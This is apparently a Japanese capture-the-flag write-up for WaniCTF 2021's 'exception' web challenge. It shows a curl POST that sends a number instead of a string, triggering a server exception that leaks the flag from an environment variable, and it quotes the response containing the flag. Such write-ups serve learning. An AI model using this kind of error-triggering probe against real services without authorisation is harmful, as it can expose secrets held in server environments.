# exception
## Wanictf 2021 spring
## Web
***
問題としてURLとサーバのプログラムが渡される。  
プログラムを読むと、例外が発生したとき、
>  "flag": os.environ.get("FLAG"),

というプログラムが走り、フラグが得られそうということがわかる。
プログラムではstring以外を受け取る例外が発生するので、数値データを渡してやればいい。また
> data = json.loads(event["body"])

とあるため、json形式でデータを送ってやる必要がある。  
というわけで、curlを使ってアクセスしてみる。  
今回はWSLからアクセスする。
> curl -X POST https://cf-basic.web.wanictf.org/hello -d '{"name":1}'

とすると以下の出力が返ってきた。  
> 前略  
Id": null, "caller": null, "sourceIp": "221.115.151.149", "principalOrgId": null, "accessKey": null, "cognitoAuthenticationType": null, "cognitoAuthenticationProvider": null, "userArn": null, "userAgent": "Amazon CloudFront", "user": null}, "domainName": "boakqtdih8.execute-api.us-east-1.amazonaws.com", "apiId": "boakqtdih8"}, "body": "{\"name\":1}", "isBase64Encoded": false}, "flag": "FLAG{b4d_excep7ion_handl1ng}"}

一番最後にフラグが帰ってきていることが分かる。これをsubmitする。